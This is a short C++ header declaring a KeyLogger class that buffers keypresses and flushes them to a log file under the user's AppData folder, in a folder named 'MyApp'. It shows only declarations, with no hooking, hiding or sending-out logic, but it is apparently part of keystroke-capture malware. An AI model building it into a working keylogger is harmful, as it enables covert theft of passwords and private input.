// KeyLogger.hpp
#pragma once
#include <Windows.h>
#include <iostream>
#include <string>
#include "Types.hpp"
#include "Logger.hpp"
#include <fstream>
#include <filesystem>

class KeyLogger {
    private:
        int flushBufferSize = 10;
        const char* appdata = std::getenv("APPDATA");  // AppData\Roaming
        std::filesystem::path logfilepath = std::filesystem::path(appdata) / "MyApp" / "log" / "logfile.txt";
    public:
        KeyLogger(){}
        static inline std::string keyBuffer;
        void onKeyPress(std::string str);
        void flushBufferToFile();
};